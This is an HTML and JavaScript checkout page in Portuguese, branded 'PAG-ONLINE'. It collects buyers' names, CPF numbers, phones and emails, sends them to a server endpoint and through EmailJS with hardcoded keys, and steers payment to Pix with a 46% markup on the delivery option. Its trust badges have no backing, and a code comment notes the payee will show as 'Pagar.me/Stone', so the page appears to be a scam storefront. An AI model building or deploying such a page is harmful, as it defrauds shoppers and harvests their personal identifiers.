<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opções de Pagamento | Pagamento Seguro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        :root {
            --primary: #0055ff;
            --primary-dark: #0033cc;
            --primary-light: #e8f0ff;
            --accent: #00bfff;
            --success: #28a745;
            --warning: #ff6b35;
            --danger: #ff3b30;
            --text-dark: #1a1a1a;
            --text-gray: #555;
            --text-light: #888;
            --bg-light: #f5f7fa;
            --bg-white: #ffffff;
            --border-color: #e0e4e8;
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.06);
            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.12);
            --pix-color: var(--primary);
            --pix-bg: #f0fffe;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: var(--bg-light);
            color: var(--text-dark);
            line-height: 1.6;
            scroll-behavior: smooth;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 0;
            background-color: var(--bg-light);
        }

        .container {
            width: 100%;
            max-width: 480px;
            background-color: var(--bg-white);
            box-shadow: var(--shadow-md);
            display: flex;
            flex-direction: column;
            margin-bottom: 0;
        }

        .header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            color: var(--bg-white);
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: var(--shadow-md);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
            flex: 1;
        }

        .back-btn {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: var(--bg-white);
            font-size: 1.1rem;
            cursor: pointer;
            padding: 8px 10px;
            border-radius: 6px;
            transition: all 0.2s ease;
        }

        .brand-section {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .brand-logo {
            font-size: 1.3rem;
            font-weight: 800;
            letter-spacing: -1px;
            line-height: 1;
        }

        .brand-tagline {
            font-size: 0.7rem;
            opacity: 0.9;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .search-btn, .cart-btn {
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: var(--bg-white);
            width: 36px;
            height: 36px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 1rem;
            position: relative;
        }

        .cart-badge {
            position: absolute;
            top: -8px;
            right: -8px;
            background-color: var(--danger);
            color: white;
            font-size: 0.65rem;
            font-weight: bold;
            min-width: 20px;
            height: 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid var(--bg-white);
        }

        .trust-banner {
            background: linear-gradient(90deg, rgba(40, 167, 69, 0.1) 0%, rgba(0, 191, 255, 0.1) 100%);
            border-bottom: 1px solid rgba(40, 167, 69, 0.2);
            padding: 10px 20px;
            display: flex;
            align-items: center;
            justify-content: space-around;
            gap: 8px;
            font-size: 0.75rem;
            color: var(--text-gray);
            font-weight: 600;
        }

        .trust-item {
            display: flex;
            align-items: center;
            gap: 6px;
            flex: 1;
            text-align: center;
            justify-content: center;
        }

        .trust-item i {
            color: var(--success);
            font-size: 1rem;
        }

        .review-block {
            padding: 20px;
            background-color: var(--bg-white);
            animation: fadeIn 0.3s ease-out;
        }

        .review-header-bar {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .review-back-btn {
            background: var(--bg-light);
            border: none;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: var(--text-dark);
        }

        .review-header-title {
            font-size: 1.2rem;
            font-weight: 800;
            color: var(--text-dark);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .review-header-title i {
            color: var(--primary);
        }

        .payment-options-container {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .payment-option-card {
            border: 2px solid var(--border-color);
            border-radius: 20px;
            padding: 24px;
            margin-bottom: 20px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
            position: relative;
            overflow: hidden;
            background-color: var(--bg-white);
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .payment-option-card.selected {
            border: 3px solid var(--primary);
            background: linear-gradient(135deg, rgba(0, 85, 255, 0.05) 0%, rgba(0, 85, 255, 0.02) 100%);
            box-shadow: 0 12px 32px rgba(0, 85, 255, 0.18);
        }

        .payment-option-card.selected::after {
            content: '✓';
            position: absolute;
            top: 16px;
            right: 16px;
            width: 28px;
            height: 28px;
            background: var(--primary);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            font-size: 0.9rem;
        }

        .payment-option-icon {
            font-size: 1.8rem;
            color: var(--primary);
            margin-bottom: 4px;
        }

        .payment-option-title {
            font-size: 1.1rem;
            font-weight: 800;
            color: var(--text-dark);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .promo-badge {
            background-color: rgba(40, 167, 69, 0.08); 
            color: #1e7e34;
            border: 1px solid rgba(40, 167, 69, 0.2);
            padding: 2px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
            height: 20px;
            display: inline-flex;
            align-items: center;
        }

        .payment-option-price {
            font-size: 1.5rem;
            font-weight: 900;
            color: var(--primary);
        }

        .payment-option-desc {
            font-size: 0.85rem;
            color: var(--text-gray);
            line-height: 1.4;
        }

        .pix-form-container {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid rgba(50, 188, 173, 0.2);
            display: none;
            flex-direction: column;
            gap: 12px;
            animation: fadeIn 0.3s ease-out;
        }

        .payment-option-card.selected .pix-form-container {
            display: flex;
        }

        .pix-input-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .pix-input-group label {
            font-size: 0.75rem;
            font-weight: 700;
            color: var(--primary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .pix-input-group input {
            padding: 12px 14px;
            border: 1.5px solid rgba(50, 188, 173, 0.3);
            border-radius: 10px;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.2s;
        }

        .pix-input-group input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(50, 188, 173, 0.1);
        }

        .payment-action-btn {
            background: var(--pix-color);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-weight: 800;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
        }

        .payment-action-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .pix-qr-container {
            display: none;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            padding: 20px;
            background: var(--bg-white);
            border-radius: 20px;
            animation: fadeIn 0.4s ease-out;
        }

        .pix-qr-image-wrapper {
            background: white;
            padding: 15px;
            border-radius: 16px;
            box-shadow: var(--shadow-md);
            border: 1px solid var(--border-color);
        }

        .pix-qr-image-wrapper img {
            width: 200px;
            height: 200px;
            display: block;
        }

        .pix-copy-box {
            width: 100%;
            background: var(--bg-light);
            border: 1.5px dashed var(--primary);
            border-radius: 12px;
            padding: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .pix-copy-text {
            flex: 1;
            font-size: 0.8rem;
            font-weight: 600;
            color: var(--text-gray);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            font-family: monospace;
        }

        .pix-copy-icon-btn {
            background: white;
            border: 1px solid var(--border-color);
            color: var(--text-gray);
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .waiting-payment-section {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 10px;
            background: rgba(0, 85, 255, 0.05);
            border-radius: 10px;
        }

        .modern-spinner {
            width: 18px;
            height: 18px;
            border: 3px solid rgba(0, 85, 255, 0.1);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .waiting-text {
            font-size: 0.85rem;
            font-weight: 700;
            color: var(--primary);
        }

        .duty-info-section {
            background: #fff;
            border: 1px solid var(--border-color);
            border-radius: 14px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .duty-header {
            font-size: 0.85rem;
            font-weight: 800;
            color: var(--text-dark);
            display: flex;
            align-items: center;
            gap: 8px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 8px;
        }

        .duty-user-data {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .duty-field {
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
            color: var(--text-dark);
        }

        .duty-label {
            font-weight: 600;
            color: var(--text-gray);
        }

        .duty-value {
            font-weight: 700;
            text-align: right;
        }

        .duty-warning {
            font-size: 0.75rem;
            color: var(--text-gray);
            margin-top: 12px;
            line-height: 1.4;
            background: rgba(0, 0, 0, 0.03);
            padding: 10px 12px;
            border-radius: 8px;
            border-left: 3px solid var(--pix-color);
            display: flex;
            align-items: flex-start;
            gap: 8px;
        }

        .duty-warning i {
            color: var(--primary);
            margin-top: 2px;
        }

        .security-badges {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 5px;
            opacity: 0.7;
        }

        .security-badge {
            font-size: 0.65rem;
            font-weight: 700;
            color: var(--text-light);
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .security-badge i {
            color: var(--success);
        }

        .delivery-warning-container {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid var(--border-color);
            display: none;
            flex-direction: column;
            gap: 12px;
            animation: fadeIn 0.3s ease-out;
        }

        .payment-option-card.selected .delivery-warning-container {
            display: flex;
        }

        .delivery-warning-box {
            background: rgba(255, 107, 53, 0.08);
            border: 1px solid rgba(255, 107, 53, 0.2);
            border-radius: 12px;
            padding: 12px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }

        .delivery-warning-box i {
            color: var(--warning);
            font-size: 1rem;
            margin-top: 2px;
        }

        .delivery-warning-text {
            font-size: 0.8rem;
            font-weight: 600;
            color: #b34a26;
            line-height: 1.4;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
            backdrop-filter: blur(4px);
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-content {
            background: white;
            width: 100%;
            max-width: 400px;
            border-radius: 24px;
            padding: 30px;
            position: relative;
            animation: modalSlideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes modalSlideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal-close-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: #f0f2f5;
            border: none;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-gray);
        }

        .modal-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            margin: 0 auto 20px;
        }

        .modal-icon.warning { background: rgba(255, 107, 53, 0.1); color: var(--warning); }
        .modal-icon.success { background: rgba(40, 167, 69, 0.1); color: var(--success); }

        .modal-title {
            font-size: 1.4rem;
            font-weight: 800;
            text-align: center;
            margin-bottom: 10px;
        }

        .modal-text {
            text-align: center;
            color: var(--text-gray);
            font-size: 0.95rem;
            margin-bottom: 25px;
        }

        .modal-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .btn-modal {
            padding: 16px;
            border-radius: 14px;
            font-weight: 800;
            font-size: 1rem;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
        }

        .btn-modal-continue {
            background: var(--primary);
            color: white;
        }

        .btn-modal-pix {
            background: var(--pix-color);
            color: white;
        }

        .contact-form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .form-group label {
            font-size: 0.85rem;
            font-weight: 700;
            color: var(--text-dark);
        }

        .form-group input {
            padding: 12px 16px;
            border: 2px solid var(--border-color);
            border-radius: 12px;
            font-size: 1rem;
        }

        .btn-send-form {
            background: var(--primary);
            color: white;
            margin-top: 10px;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .pix-error-msg {
            background: rgba(255, 59, 48, 0.08);
            border: 1px solid rgba(255, 59, 48, 0.2);
            border-radius: 10px;
            padding: 10px 14px;
            font-size: 0.85rem;
            color: var(--danger);
            font-weight: 600;
            display: none;
            align-items: center;
            gap: 8px;
        }

        .pix-error-msg.visible {
            display: flex;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="header-left">
                <button class="back-btn" title="Voltar">
                    <i class="fas fa-arrow-left"></i>
                </button>
                <div class="brand-section">
                    <div class="brand-logo">PAG-ONLINE</div>
                    <div class="brand-tagline">Pagamento Seguro</div>
                </div>
            </div>
            <div class="header-right">
                <button class="search-btn" title="Buscar">
                    <i class="fas fa-search"></i>
                </button>
                <button class="cart-btn" id="cart-btn" title="Carrinho">
                    <i class="fas fa-shopping-cart"></i>
                    <span class="cart-badge" id="cart-badge">1</span>
                </button>
            </div>
        </header>

        <div class="trust-banner">
            <div class="trust-item">
                <i class="fas fa-lock"></i>
                <span>100% Seguro</span>
            </div>
            <div class="trust-item">
                <i class="fas fa-check-circle"></i>
                <span>Garantido</span>
            </div>
        </div>

        <div id="cart-content-wrapper"></div>
    </div>

    <div class="modal-overlay" id="delivery-modal">
        <div class="modal-content">
            <button class="modal-close-btn" id="modal-close-btn-delivery">
                <i class="fas fa-times"></i>
            </button>

            <div id="modal-step-1">
                <div class="modal-icon warning"><i class="fas fa-exclamation-triangle"></i></div>
                <h3 class="modal-title">Você tem certeza?</h3>
                <p class="modal-text" id="delivery-warning-text"></p>
                <div class="modal-buttons">
                    <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Pix (Desconto)</button>
                    <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">
                        Continuar sem desconto
                    </button>
                </div>
            </div>

            <div id="modal-step-2" style="display:none;">
                <h3 class="modal-title">Dados para Entrega</h3>
                <p class="modal-text">Preencha seus dados para finalizarmos seu pedido na entrega.</p>
                <form class="contact-form" id="delivery-contact-form">
                    <div class="form-group">
                        <label>Nome Completo</label>
                        <input type="text" id="delivery-name" placeholder="Seu nome completo" required>
                    </div>
                    <div class="form-group">
                        <label>E-mail</label>
                        <input type="email" id="delivery-email" placeholder="seu@email.com" required>
                    </div>
                    <div class="form-group">
                        <label>CPF</label>
                        <input type="tel" id="delivery-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                    </div>
                    <div class="form-group">
                        <label>Telefone</label>
                        <input type="tel" id="delivery-phone" placeholder="(00) 00000-0000" required>
                    </div>
                    <button type="submit" class="btn-modal btn-send-form">Enviar Pedido</button>
                </form>
            </div>

            <div id="modal-step-3" style="display:none;">
                <div class="modal-icon success"><i class="fas fa-check-circle"></i></div>
                <h3 class="modal-title">Pedido Recebido!</h3>
                <p class="modal-text">Obrigado! Recebemos sua solicitação de pagamento na entrega. Em breve entraremos em contato para confirmar os detalhes.</p>
                <button class="btn-modal btn-modal-continue" id="modal-close-final">Fechar</button>
            </div>
        </div>
    </div>

    <script>
        // ==================== CONFIGURAÇÕES FIXAS ====================
        const EMAILJS_SERVICE_ID = 'service_k27y198';
        const EMAILJS_TEMPLATE_ID = 'template_1w89qur';
        const EMAILJS_PUBLIC_KEY = 'jqboDMGvZGf3rHYv5';
        // =============================================================

        function getUrlParameter(name) {
            const params = new URLSearchParams(window.location.search);
            return params.get(name);
        }

        const subtotalFromUrl = getUrlParameter('subtotal');
        const subtotalValue = subtotalFromUrl ? parseFloat(subtotalFromUrl) : 89.47;

        if (EMAILJS_PUBLIC_KEY && EMAILJS_PUBLIC_KEY !== 'public_xxx') {
            emailjs.init(EMAILJS_PUBLIC_KEY);
        }

        function maskCPF(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
                .replace(/(-\d{2})\d+?$/, '$1');
        }

        function maskPhone(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{2})(\d)/g, '($1) $2')
                .replace(/(\d{5})(\d)/, '$1-$2')
                .replace(/(-\d{4})\d+?$/, '$1');
        }

        function setupPhoneInput(inputElement) {
            inputElement.addEventListener('input', (e) => {
                e.target.value = maskPhone(e.target.value);
            });
        }

        function setupCPFInput(inputElement) {
            inputElement.addEventListener('input', (e) => {
                e.target.value = maskCPF(e.target.value);
            });
        }

        function renderPaymentOptions() {
            const baseTotal = subtotalValue;
            const deliveryTotal = baseTotal * 1.46;

            const paymentHTML = `
                <div class="review-block">
                    <div class="review-header-bar">
                        <button class="review-back-btn" id="payment-back-btn">
                            <i class="fas fa-arrow-left"></i>
                        </button>
                        <div class="review-header-title"><i class="fas fa-credit-card"></i> Opções de Pagamento</div>
                    </div>
                    <div class="payment-options-container">
                        <div class="payment-option-card" id="pay-now-pix">
                            <div id="pix-original-content">
                                <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
                                <div class="payment-option-title">
                                    <span>Pagar Agora - Pix</span>
                                    <span class="promo-badge">Promoção</span>
                                </div>
                                <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
                                <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
                                <div class="pix-form-container" id="pix-form">
                                    <div class="pix-input-group">
                                        <label for="pix-name">Nome e Sobrenome</label>
                                        <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
                                    </div>
                                    <div class="pix-input-group">
                                        <label for="pix-cpf">CPF</label>
                                        <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                                    </div>
                                    <div class="pix-input-group">
                                        <label for="pix-phone">Telefone</label>
                                        <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
                                    </div>
                                    <div class="pix-error-msg" id="pix-error">
                                        <i class="fas fa-exclamation-circle"></i>
                                        <span id="pix-error-text">Preencha todos os campos corretamente.</span>
                                    </div>
                                    <button class="payment-action-btn" id="generate-pix-btn">
                                        <span>GERAR QR CODE PIX</span>
                                        <i class="fas fa-arrow-right"></i>
                                    </button>
                                </div>
                            </div>
                            <div id="pix-qr-content" class="pix-qr-container">
                                <div class="pix-qr-image-wrapper">
                                    <img id="pix-qr-img" src="" alt="QR Code Pix">
                                </div>
                                <div class="pix-copy-box" id="pix-copy-btn">
                                    <div class="pix-copy-text" id="pix-code-text">Copiando código...</div>
                                    <div class="pix-copy-icon-btn" id="pix-copy-icon">
                                        <i class="fas fa-copy"></i>
                                    </div>
                                </div>
                                <div class="waiting-payment-section">
                                    <div class="modern-spinner"></div>
                                    <div class="waiting-text">Aguardando pagamento...</div>
                                </div>
                                <div class="duty-info-section">
                                    <div class="duty-header"><i class="fas fa-user-shield"></i> Dados do Pagador</div>
                                    <div class="duty-user-data">
                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-name">-</span></div>
                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-cpf">-</span></div>
                                        <div class="duty-field"><span class="duty-label">Valor:</span><span class="duty-value">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span></div>
                                    </div>
                                    <div class="duty-warning">
                                        <i class="fas fa-info-circle"></i>
                                        <span>Após o pagamento, a liberação do seu pedido será imediata e automática.</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="payment-option-card" id="pay-on-delivery">
                            <div class="payment-option-icon"><i class="fas fa-truck"></i></div>
                            <div class="payment-option-title">Pagar na Entrega</div>
                            <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
                            <div class="payment-option-desc">Pague ao receber o produto. Sem o desconto de 46% do Pix.</div>
                            <div class="delivery-warning-container">
                                <div class="delivery-warning-box">
                                    <i class="fas fa-exclamation-circle"></i>
                                    <div class="delivery-warning-text">Atenção: Nesta opção você perde o desconto de R$ ${(deliveryTotal - baseTotal).toFixed(2).replace('.', ',')}.</div>
                                </div>
                                <button class="payment-action-btn" id="confirm-delivery-btn" style="background: var(--text-dark);">
                                    <span>CONTINUAR PEDIDO</span>
                                    <i class="fas fa-arrow-right"></i>
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="security-badges">
                        <div class="security-badge"><i class="fas fa-shield-alt"></i> SSL Seguro</div>
                        <div class="security-badge"><i class="fas fa-check"></i> Pagar.me</div>
                    </div>
                </div>
            `;

            document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
            setupPaymentListeners();
        }

        function setupPaymentListeners() {
            const pixCard = document.getElementById('pay-now-pix');
            const deliveryCard = document.getElementById('pay-on-delivery');
            const pixForm = document.getElementById('pix-form');
            const generateBtn = document.getElementById('generate-pix-btn');
            const confirmDeliveryBtn = document.getElementById('confirm-delivery-btn');

            setupCPFInput(document.getElementById('pix-cpf'));
            setupPhoneInput(document.getElementById('pix-phone'));

            pixCard.addEventListener('click', () => {
                pixCard.classList.add('selected');
                deliveryCard.classList.remove('selected');
            });

            deliveryCard.addEventListener('click', () => {
                deliveryCard.classList.add('selected');
                pixCard.classList.remove('selected');
            });

            generateBtn.addEventListener('click', async (e) => {
                e.stopPropagation();
                const name = document.getElementById('pix-name').value;
                const cpf = document.getElementById('pix-cpf').value;
                const phone = document.getElementById('pix-phone').value;
                const errorMsg = document.getElementById('pix-error');

                if (!name || cpf.length < 14 || phone.length < 14) {
                    errorMsg.classList.add('visible');
                    return;
                }
                errorMsg.classList.remove('visible');

                generateBtn.disabled = true;
                generateBtn.innerHTML = '<div class="spinner"></div>';

                try {
                    const response = await fetch('/api/create-pix-order', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            name, cpf, phone,
                            amount: subtotalValue
                        })
                    });

                    const data = await response.json();

                    if (data.success) {
                        // Redireciona para a página de checkout da Pagar.me
                        // Lá o recebedor aparecerá como Pagar.me/Stone
                        window.location.href = data.checkout_url;
                    } else {
                        alert('Erro ao gerar Pix: ' + (data.message || 'Tente novamente.'));
                        generateBtn.disabled = false;
                        generateBtn.innerHTML = '<span>GERAR QR CODE PIX</span><i class="fas fa-arrow-right"></i>';
                    }
                } catch (err) {
                    console.error(err);
                    alert('Erro de conexão com o servidor.');
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = '<span>GERAR QR CODE PIX</span><i class="fas fa-arrow-right"></i>';
                }
            });

            confirmDeliveryBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                const diff = (subtotalValue * 1.46) - subtotalValue;
                document.getElementById('delivery-warning-text').innerText = `Ao escolher pagar na entrega, você perderá o desconto de R$ ${diff.toFixed(2).replace('.', ',')} exclusivo para Pix. Deseja continuar?`;
                document.getElementById('delivery-modal').classList.add('active');
            });
        }

        // Modal Logic
        document.getElementById('modal-close-btn-delivery').onclick = () => document.getElementById('delivery-modal').classList.remove('active');
        document.getElementById('modal-back-to-pix').onclick = () => document.getElementById('delivery-modal').classList.remove('active');
        document.getElementById('modal-continue-delivery').onclick = () => {
            document.getElementById('modal-step-1').style.display = 'none';
            document.getElementById('modal-step-2').style.display = 'block';
        };

        document.getElementById('delivery-contact-form').onsubmit = async (e) => {
            e.preventDefault();
            const btn = e.target.querySelector('button');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div>';

            const templateParams = {
                from_name: document.getElementById('delivery-name').value,
                from_email: document.getElementById('delivery-email').value,
                cpf: document.getElementById('delivery-cpf').value,
                phone: document.getElementById('delivery-phone').value,
                payment_method: 'Pagar na Entrega',
                total_value: `R$ ${(subtotalValue * 1.46).toFixed(2).replace('.', ',')}`
            };

            try {
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
                document.getElementById('modal-step-2').style.display = 'none';
                document.getElementById('modal-step-3').style.display = 'block';
            } catch (err) {
                alert('Erro ao enviar pedido. Tente novamente.');
                btn.disabled = false;
                btn.innerHTML = 'Enviar Pedido';
            }
        };

        document.getElementById('modal-close-final').onclick = () => location.reload();

        // Init
        renderPaymentOptions();
    </script>
</body>
</html>
